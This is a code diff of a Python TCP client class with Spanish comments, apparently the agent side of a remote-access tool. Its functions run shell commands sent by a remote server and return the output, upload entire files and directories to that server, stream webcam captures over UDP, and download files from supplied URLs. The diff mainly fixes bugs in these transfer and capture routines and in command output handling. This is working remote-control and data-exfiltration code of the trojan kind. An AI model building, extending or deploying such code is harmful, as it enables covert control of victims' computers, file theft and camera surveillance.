@@ -107,55 +107,56 @@ class TCP:
         sleep(0.05)
         peso = os.path.getsize(ubicacion)
         paquetes = int(peso/self.__chunk)
-        self.__sock.send(str(paquetes).encode())
+        self.__sock.send(f"{peso}-{paquetes}".encode())
 
-        sleep(0.1)
-        with open(ubicacion, 'rb') as archivo:
-            info = archivo.read(self.__chunk)
-            while info:
-                self.enviarDatos(info)
+        if peso > 0:
+            sleep(0.1)
+            with open(ubicacion, 'rb') as archivo:
                 info = archivo.read(self.__chunk)
-                msg = self.__sock.recv(8).decode()
-                if msg == "end":
-                    break
-        archivo.close()
+                while info:
+                    self.enviarDatos(info)
+                    info = archivo.read(self.__chunk)
+                    msg = self.__sock.recv(8).decode()
+                    if msg == "end":
+                        break
+            archivo.close()
 
     # Funcion para recibir un archivo
     # ubicacion --> ubicacion en donde se guardara el archivo recibido
     def recibirArchivo(self, ubicacion):
-        with open(ubicacion, 'wb') as archivo:
-            while True:
-                info = self.recibirDatos()
-                archivo.write(info)
+        peso = int(self.__sock.recv(1024).decode())
+        if peso > 0:
+            with open(ubicacion, 'wb') as archivo:
+                while True:
+                    info = self.recibirDatos()
+                    archivo.write(info)
 
-                if len(info) < self.__chunk:
-                    self.__sock.send("end".encode())
-                    break
-                else:
-                    self.__sock.send("ok".encode())
-        archivo.close()
+                    if len(info) < self.__chunk:
+                        self.__sock.send("end".encode())
+                        break
+                    else:
+                        self.__sock.send("ok".encode())
+            archivo.close()
 
     # Funcion para enviar archivos de un directorio
     # origen --> ubicacion del directorio que se quiere enviar
     # index --> indice desde el que se quiere iniciar
     def enviarDirectorio(self, origen, index):
-        # Se crea una lista de archivos
+        # Se obtiene el numero de archivos
         archivos = []
         for i in os.listdir(origen):
             archivo = f"{origen}/{i}"
             if os.path.isfile(archivo):
                 archivos.append(archivo)
 
-        # Se envia el numero de archivos del directorio al servidor
         sleep(0.2)
         tam = len(archivos)
         self.__sock.send(str(tam).encode())
 
+        # Se comienzan a enviar los archivos
         if index > tam:
             index = 1
         while index <= tam:
-            # Se obtiene informacion del archivo en turno y
-            # se envia al servidor
             nombre = self.getNombre(archivos[index-1])
             peso = os.path.getsize(archivos[index-1])
             paquetes = str(int(peso/self.__chunk))
@@ -163,19 +164,13 @@ class TCP:
             sleep(0.1)
             self.__sock.send(info.encode())
 
-            # Se espera la confirmacion del servidor para
-            # enviar o no el archivo
             res = self.__sock.recv(1024).decode()
             if res == 'S':
-                # Se envia el archivo
                 self.enviarArchivo(archivos[index-1])
-                # Se espera un mensaje del servidor para seguir
-                # enviando archivos o no
                 msg = self.__sock.recv(1024).decode()
                 if msg == "error":
                     break
             elif res == "quit":
-                # Si la respuesta es 'quit' se termina la transferencia
                 break
             else:
                 pass
@@ -191,31 +186,25 @@ class TCP:
         if not os.path.isdir(destino):
             os.mkdir(destino)
 
-        # Se recibe el numero de archivos que se recibiran
+        # Se recibe el numero de archivos
         tam = int(self.__sock.recv(1024).decode())
 
+        # Se comienzan a recibir los archivos
         if index > tam:
             index = 1
         while index <= tam:
-            # Se espera la confirmacion del servidor para
-            # recibir o no un archivo
             res = self.__sock.recv(1024).decode()
 
             if res == 'S':
                 try:
-                    # Se recibe el nombre del archivo
                     nombre = self.__sock.recv(1024).decode()
-                    # Se recibe el archivo
                     self.recibirArchivo(f"{destino}/{nombre}")
                     sleep(0.08)
-                    # Se envia un mensaje al servidor para
-                    # seguir recibiendo archivos o no
                     self.__sock.send("ok".encode())
                 except:
                     self.__sock.send("error: Error al recibir el archivo (sdt)".encode())
                     break
             elif res == "quit":
-                # Si la respuesta es 'quit' se termina la transferencia
                 break
             else:
                 pass
@@ -340,12 +329,15 @@ class TCP:
                 sleep(0.1)
                 udp.captura(camara)
                 udp.close()
+                captura.release()
                 self.__sock.send("client-UDP desconectado".encode())
             except:
                 udp.close()
+                captura.release()
                 self.__sock.send("client-UDP desconectado".encode())
         else:
             self.__sock.send(f"error: Camara \"{camara}\" no encontrada".encode())
+            captura.release()
 
     # Funcion para enviar un directorio al servidor
     # cmd --> comando recibido
@@ -586,6 +578,7 @@ class TCP:
         if re.search("-n[= ]", cmd):
             url = re.findall("-u[= ]([a-zA-Z0-9./ ].*) -n", cmd)[0]
             nombre = re.findall("-n[= ]([a-zA-Z0-9./ ].*)", cmd)[0]
+            valido = True
         else:
             url = re.findall("-u[= ]([a-zA-Z0-9./ ].*)", cmd)[0]
             valido = False
@@ -601,20 +594,25 @@ class TCP:
                     break
                 i += 1
 
-            nombre = re.findall(f"/([a-zA-Z0-9_ ].+[.]{ext})", url)[0]
-            nombre = nombre.split('/')[-1]
+            if valido:
+                nombre = re.findall(f"/([a-zA-Z0-9_ ].+[.]{ext})", url)[0]
+                nombre = nombre.split('/')[-1]
 
-        try:
-            req = requests.get(url)
+        if valido:
+            self.__sock.send("ok".encode())
+            try:
+                req = requests.get(url)
 
-            with open(nombre, 'wb') as archivo:
-                archivo.write(req.content)
-            archivo.close()
+                with open(nombre, 'wb') as archivo:
+                    archivo.write(req.content)
+                archivo.close()
 
-            self.__sock.send(f"Archivo \"{nombre}\" descargado correctamente".encode())
+                self.__sock.send(f"Archivo \"{nombre}\" descargado correctamente".encode())
 
-        except:
-            self.__sock.send(f"error: Error al descargar el archivo".encode())
+            except:
+                self.__sock.send(f"error: Error al descargar el archivo".encode())
+        else:
+            self.__sock.send("error: URL no valida".encode())
 
     # Funcion para enviar al servidor la cantidad de elementos de un directorio
     # cmd --> comando recibido
@@ -623,27 +621,23 @@ class TCP:
         if os.path.isdir(directorio):
             self.__sock.send("ok".encode())
             cont = 0
-            sleep(0.1)
+            sleep(0.08)
 
-            # Cuenta los archivos
             if re.search("-f[= ]", cmd):
                 for i in os.listdir(directorio):
                     archivo = f"{directorio}/{i}"
                     if os.path.isfile(archivo):
                         cont += 1
                 self.__sock.send(f"{cont} archivos encontrados".encode())
-            # Cuenta los directorios
             elif re.search("-d[= ]", cmd):
                 for i in os.listdir(directorio):
                     carpeta = f"{directorio}/{i}"
                     if os.path.isdir(carpeta):
                         cont += 1
                 self.__sock.send(f"{cont} directorios encontrados".encode())
-            # Cuenta todos los elementos
             elif re.search("-a[= ]", cmd):
                 cont = len(os.listdir(directorio))
                 self.__sock.send(f"{cont} elementos encontrados".encode())
-            # Cuenta todos los elementos
             else:
                 cont = len(os.listdir(directorio))
                 self.__sock.send(f"{cont} elementos encontrados".encode())
@@ -665,7 +659,7 @@ class TCP:
             if self.__myOs == "windows":
                 info = info.decode("cp850")
 
-            if info == b'':
+            if info == '':
                 self.__sock.send("[+] Comando ejecutado --> Salida vacia".encode())
             else:
                 i = 0
@@ -832,15 +826,21 @@ class TCP:
                     except:
                         continue
 
+                # Si el comando es 'lendir'...
                 elif cmd.lower()[:6] == "lendir":
                     try:
+                        # Se manda a llamar a la funcion
+                        # 'self.lenDir'
                         self.lenDir(cmd)
 
                     except:
                         continue
 
+                # Si el comando es 'save'...
                 elif cmd.lower()[:4] == "save":
                     try:
+                        # Se manda a llamar a la funcion
+                        # 'self.save'
                         cmd = cmd[5:]
                         self.save(cmd)
 
@@ -866,8 +866,8 @@ class TCP:
                             if self.__myOs == "windows":
                                 info = info.decode("cp850")
 
-                            if info == b'':
-                                self.__sock.send("[+] Comando ejecutado --> Salida vacia".encode())
+                            if info == '':
+                                self.enviarDatos("[+] Comando ejecutado --> Salida vacia".encode())
 
                             else:
                                 i = 0
